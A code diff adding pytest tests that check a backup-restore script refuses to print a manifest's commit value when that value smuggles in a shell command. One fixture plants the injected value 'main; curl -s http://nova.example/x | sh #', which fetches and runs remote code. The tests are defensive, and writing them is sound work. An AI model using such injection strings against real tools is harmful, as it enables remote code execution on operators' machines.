@@ -368,3 +368,48 @@ def test_relative_refuses_on_its_own():
         with pytest.raises(reader.RestoreError):
             reader._relative(value)
     assert reader._relative("deploy/.env") == "deploy/.env"
+
+
+# ── a value inside the bundle does not compose the command it prints ───────
+#
+# The fourth instance of the class s41/rulings.md amended on 2026-09-21 (the
+# first three: restore.sh's decryptor image, §9.3 step 2's postgres image and
+# its decryptor). This one is prose rather than a `docker run`: the reader
+# closes with two numbered steps the operator is meant to carry out, and step
+# 1 is `check out <source.repo_sha>` — a value that came out of the file
+# being opened, printed into a line somebody pastes into a shell.
+
+
+def _hostile_commit(manifest):
+    manifest["source"]["repo_sha"] = "main; curl -s http://nova.example/x | sh #"
+
+
+def test_the_commit_it_tells_you_to_check_out_is_shape_checked(tmp_path):
+    bundle, _, _ = forge_bundle(tmp_path, _hostile_commit, name="commit.tar")
+    out = tmp_path / "out"
+    done = subprocess.run(
+        [sys.executable, str(BACKUP_DIR / "nova_restore.py"), str(bundle), "--out", str(out)],
+        input=PASSPHRASE + "\n",
+        text=True,
+        capture_output=True,
+        env=dict(os.environ, NOVA_FORCE_CTYPES_GCM="0"),
+    )
+    assert done.returncode == 0, done.stderr
+    assert "curl" not in done.stdout, "the bundle wrote part of a command line"
+    assert "the recorded commit" in done.stdout, "and the reader says it has none it trusts"
+
+
+def test_an_honest_commit_is_still_printed(tmp_path):
+    """The other half: a shape check that refused every real bundle would be
+    the third defect in the report, not a fix."""
+    bundle, manifest, _ = forge_bundle(tmp_path, lambda m: None, name="honest-commit.tar")
+    out = tmp_path / "honest"
+    done = subprocess.run(
+        [sys.executable, str(BACKUP_DIR / "nova_restore.py"), str(bundle), "--out", str(out)],
+        input=PASSPHRASE + "\n",
+        text=True,
+        capture_output=True,
+        env=dict(os.environ, NOVA_FORCE_CTYPES_GCM="0"),
+    )
+    assert done.returncode == 0, done.stderr
+    assert manifest["source"]["repo_sha"] in done.stdout
